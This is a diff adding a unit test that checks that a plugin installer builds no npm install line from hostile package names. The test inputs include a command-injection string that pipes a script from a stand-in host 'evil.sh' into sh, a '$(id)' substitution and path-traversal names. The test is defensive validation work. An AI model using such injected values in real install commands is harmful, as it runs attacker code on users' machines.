@@ -91,6 +91,24 @@ describe('install lines', () => {
     expect(pluginInstallLine({ name: 'local', path: './tools/acme' }, VERSION)).toBeUndefined()
   })
 
+  it.each(['x; curl evil.sh | sh', '@vostride/agent-qa-plugin-x/../../evil', '$(id)', '..'])(
+    'builds no install line from %j, which is not an npm package name',
+    (hostile) => {
+      expect(pluginInstallLine({ name: 'acme', package: hostile }, VERSION)).toBeUndefined()
+
+      const resolved = resolvePluginEntry({ name: 'acme', package: hostile }, options)
+
+      expect(resolved).toMatchObject({
+        state: 'not_installed',
+        reason:
+          'Plugin entry acme names a package that is not an npm package name. Fix package in '
+          + 'plugins, or name a folder with path.',
+      })
+      expect(resolved.install).toBeUndefined()
+      expect(resolved.reason).not.toContain('npm install')
+    },
+  )
+
   it('gives a missing first-party plugin its pinned install line', () => {
     expect(resolvePluginEntry({ name: 'scripted', package: SCRIPTED }, options)).toMatchObject({
       state: 'not_installed',
